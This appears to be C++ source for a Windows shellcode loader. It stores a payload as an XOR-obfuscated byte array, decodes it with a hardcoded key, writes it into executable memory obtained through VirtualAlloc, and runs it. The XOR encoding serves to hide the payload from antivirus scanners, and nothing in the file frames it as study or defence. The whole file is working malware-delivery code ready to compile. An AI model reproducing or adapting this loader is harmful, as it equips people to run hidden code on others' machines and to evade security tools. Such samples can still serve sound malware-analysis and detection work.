#include "stdafx.h"
#include <windows.h>
#include <iostream>

int main(int argc, char **argv) {

	char raw[] = "\x88\x8d\xf1\x74\x69\x6e\x7\xe2\x80\x48\xb4\x1\xf8\x24\x59\xe5\x35\x67\xee\x2b\x60\xee\x1\x5c\x66\xd9\x2d\x4d\x54\x86\xd8\x59\x12\x8\x6b\x42\x47\xaa\xaa\x74\x75\xa2\x91\x86\x3b\x39\xec\x39\x75\xf2\x3e\x59\xf8\x38\x78\x16\x84\x23\x64\xa8\x25\xee\x2a\x54\x68\xbd\xec\x22\x7d\x9a\x4e\x2c\xf8\x40\xe2\x6f\xb1\x5a\x9a\xd5\xb5\xaa\x7e\x75\xae\x56\x87\x1e\x93\x7a\x9\x9d\x48\x9\x4d\x1b\x83\x33\xee\x21\x50\x64\xa0\x12\xe2\x62\x2c\xe0\x3d\x65\x75\xb6\xf8\x70\xe2\x6f\xb7\xe2\x21\x5d\x50\x3e\x28\x15\x30\x34\x36\x94\x85\x26\x2b\x3f\xf8\x66\x82\xe3\x3a\x3\x56\x4b\x74\x65\x1b\x3\x1a\x5c\x38\x3f\xd\x35\x3\x43\x74\x8b\xbc\xd6\xf7\x6a\x65\x79\x5d\xa1\x27\x24\x1\x47\xe7\x0\x65\x86\xa1\x35\x23\x24\x39\x2e\x37\x2b\x35\x11\x9e\x6a\xac\x94\x96\xbb\xf0\x1\x60\x11\xb4\xcd\x79\xf3\x1\x6c\x67\x7a\x39\xf0\x92\xf\x63\x22\x3e\x6\xfe\xce\x11\x18\x8b\xb0\xf6\xb4\x1d\x62\x98\x25\x6d\xc\x98\xd\x83\xc1\xcb\x38\x98\xbe\xd\x1a\x19\x1\x73\xfd\x8a\x39\x30\x3c\x54\x8f\x1e\x77\x2a\x22\x8b\x93\x1\xac\x21\x5d\x48\x64\x72\xf9\x2d\x4a\x77\xad\x65\x3d\x20\x35\x25\x22\x3f\x28\x31\x25\x33\x2f\x27\x33\x1b\xd\xa5\x51\xe1\x94\xb0\xf0\x94\x2b\x25\x32\x96\x5e\xf\x63\xe2\x64\x14\x9a\xa6\xcf\x99\xdb\xc5\x3d\xd\xdf\xe1\xd8\xee\x8b\xbc\x52\x61\x17\x6f\xf9\x8f\x85\x6\x71\xd2\x29\x74\x19\xa\x13\x74\x36\x8c\xa1";

	char decode[sizeof raw];

	char key[] = "testingkey";

	int j = 0;
	for (int i = 0; i < sizeof raw; i++) {
		if (j == sizeof key - 1) j = 0;

		decode[i] = raw[i] ^ key[j];
		j++;
	}

	void *exec = VirtualAlloc(0, sizeof decode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	memcpy(exec, decode, sizeof decode);

	((void(*)())exec)();
}
